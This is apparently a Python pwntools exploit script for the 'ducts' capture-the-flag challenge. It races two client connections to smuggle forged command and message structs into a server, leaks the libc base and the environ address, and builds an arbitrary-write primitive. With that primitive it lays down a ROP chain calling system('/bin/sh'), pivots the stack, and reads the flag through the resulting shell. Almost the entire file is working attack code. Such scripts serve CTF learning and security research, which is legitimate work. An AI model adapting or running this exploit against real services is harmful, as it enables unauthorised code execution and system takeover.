from threading import Thread
from pwn import *

e = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = e

host = "localhost"
port = None

if args.REMOTE:
    host = "ducts.challs.m0lecon.it"

def get_one_gadgets():
    args = ["one_gadget", "-l", "100", "-r", libc.path]
    return [int(offset) + libc.address for offset in subprocess.check_output(args).decode('ascii').strip().split()]

def get_con():
    global host, port
    if args.REMOTE:
        p = remote(host, 4444)
        input("attach here")
    else:
        if args.GDB:
            p = gdb.debug([e.path], '''
            # ---< Your gdb script here >---
            continue
            ''', aslr=False)
        else:
            p = process([e.path])

    # find the service port
    x = p.recvregex(b"Port is (\d+)\n", capture=True)
    port = int(x.group(1))
    log.info(f"Service port: {port}")
    return p


def get_client():
    global host, port
    return remote(host, port)

CMD_FLUSH = 0xdeadc0de
CMD_REDACT = 0xcafebabe
CMD_PRINT = 0xdeadbeef

class Command:
    def __init__(self, cmd, data1=0x1111111111111111, data2=0x2222222222222222):
        # assert cmd in [CMD_FLUSH, CMD_REDACT, CMD_PRINT], "Invalid command: " + hex(cmd)

        self.type = 1
        self.cmd = cmd
        self.data1 = data1
        self.data2 = data2

    '''
    struct command __packed
    {
        int32_t type;
        int32_t cmd;
        void* data1;
        void* data2;
    };
    '''
    def dump(self):
        return struct.pack("<IIQQ", self.type, self.cmd, self.data1, self.data2)

    def __len__(self):
        return len(self.dump())

class Message:
    def __init__(self, name=b"Barry", data=b"", size=None, content=None):
        self.type = 0
        self.data = data
        if size is None:
            self.size = len(data)
        else:
            self.size = size

        assert len(name) <= 0x40, "Name too long"
        self.name = name
        self.content = content

        # pad name to 0x40
        self.name += b"\x00"*(0x40-len(name))

    '''
    struct message __packed
    {
        int32_t type;
        int32_t size;
        char* content;
        char name[0x40];
        char data[0x1];
    };
    '''
    def dump(self):
        return struct.pack("<IIq", self.type, self.size, self.content) + self.name + self.data

class Client:
    def __init__(self):
        old = context.log_level
        context.log_level = "error"
        self.p = get_client()
        self.p.recvuntil(b"Welcome to the network blackhole! What do you want to destroy?\n")
        context.log_level = old

    def __del__(self):
        self.p.close()

    def send(self, data, name=None):
        self.p.sendline(data)
        if name:
            self.p.sendlineafter(b"Please leave also your name for recording purposes!\n", name)

'''
Message 0x5a20cb567480 is '' by . Next is 0x74f18eab5010
Message 0x74f18eab5010 is '' by . Next is 0x5a20cb589100
Message 0x5a20cb589100 is 'lmao' by Barry. Next is 0xdeadbeef
'''
class PrintMessage:
    def __init__(self, addr, data, author, next_addr):
        self.addr = addr
        self.data = data
        self.author = author
        self.next_addr = next_addr

    def parse_from_socket(p):
        p.recvuntil(b"Message 0x")
        addr = int(p.recvuntil(b" ", drop=True), 16)
        p.recvuntil(b"is '")
        data = p.recvuntil(b"' by ", drop=True)
        author = p.recvuntil(b". Next is ", drop=True)
        nil_or_0x = p.recvuntil([b"(nil)", b"0x"])
        if nil_or_0x == b"(nil)":
            next_addr = None
        else:
            next_addr = int(p.recvuntil(b"\n", drop=True), 16)
        
        return PrintMessage(addr, data, author, next_addr)

    def __str__(self):
        next_addr = "(nil)" if self.next_addr is None else f"0x{self.next_addr:x}"
        return f"Message 0x{self.addr:x} is '{self.data}' by {self.author}. Next is {next_addr}"


# Good luck, you've got this!


server = get_con()

# add some null bytes so we don't see all the spam
# can't be all nulls, otherwise we create a bunch of fake messages
padding = (0x270fc//4) * p32(0x41)

slide = p32(0x42)*(0x20000//4)
commands = [
    Command(CMD_PRINT),
    Command(CMD_FLUSH),
]


# create huge message so we get a libc leak later
msg = b"BIGBOI" + b"\x00"*(1024*130)
Client().send(msg, name=b"libcleak")
time.sleep(0.5)

lmao = slide + b"".join([cmd.dump() for cmd in commands])


def send_command(client, cmd):
    client.send(cmd)
    client.p.close()

libc_offset = 0x2aff0

while True:
    # send both commands at the same time
    a = Client()
    b = Client()
    t1 = Thread(target=send_command, args=(a, padding))
    t2 = Thread(target=send_command, args=(b, lmao))
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    time.sleep(0.1)

    # parse the first message
    data = server.clean(1)
    if b"Message 0x" not in data:
        continue
    
    # Some truely awful code to parse the message
    server.unrecv(data)
    print(data)
    msg1 = PrintMessage.parse_from_socket(server)

    log.info(str(msg1))
    libc.address = msg1.next_addr + libc_offset
    log.info(f"Libc base: {libc.address:x}")
    break


commands = [
    Message(data=b"environ", content=libc.sym.environ-0x10),
    Command(CMD_PRINT),
    Command(CMD_FLUSH),
]
lmao = slide + b"".join([cmd.dump() for cmd in commands])


while True:
    # send both commands at the same time
    a = Client()
    b = Client()
    t1 = Thread(target=send_command, args=(a, padding))
    t2 = Thread(target=send_command, args=(b, lmao))
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    time.sleep(0.1)

    # check if out fake message is there
    data = server.clean(1)
    if b"environ" not in data:
        continue
    
    # Some truely awful code to parse the message
    server.unrecv(data)
    print(data)
    while True:
        msg = PrintMessage.parse_from_socket(server)
        if msg.data == b"environ":
            break
    
    # next msg is environ
    msg = PrintMessage.parse_from_socket(server)
    print(msg)
    environ = u64(msg.author + b"\x00\x00")
    break

log.info(f"Environ: {hex(environ)}")
backend_return = environ - 0x1b0

def arb_write(where, what):
    commands = [
        # marker
        Command(1337),
        Command(CMD_FLUSH),
        Message(data=b"arbw", content=where-0x50),
        Command(CMD_REDACT, data1=1, data2=what),
        # Command(CMD_PRINT),
    ]
    lmao = slide + b"".join([cmd.dump() for cmd in commands])


    while True:
        # send both commands at the same time
        a = Client()
        b = Client()
        t1 = Thread(target=send_command, args=(a, padding))
        t2 = Thread(target=send_command, args=(b, lmao))
        t1.start()
        t2.start()
        t1.join()
        t2.join()

        time.sleep(0.1)

        # check if our fake commands were processed
        data = server.clean(1)
        if b"1337" not in data:
            continue
        
        break




# 0x0011c011: add rsp, 0x68; ret;
pivot = libc.address + 0x11c011
log.info(f"Pivot: {hex(pivot)}")
new_stack_loc = backend_return + 0x68 + 8

# 0x001bbea1: pop rdi; ret;
pop_rdi_ret = libc.address + 0x1bbea1
ret = pop_rdi_ret + 1
chain = [
    pop_rdi_ret,
    next(libc.search(b"/bin/sh")),
    ret,
    libc.sym.system,
]
for i, gadget in enumerate(chain):
    arb_write(new_stack_loc+i*8, gadget)

# pivot to our new stack
arb_write(backend_return, pivot)

server.sendline(b"cat flag*")
server.interactive()
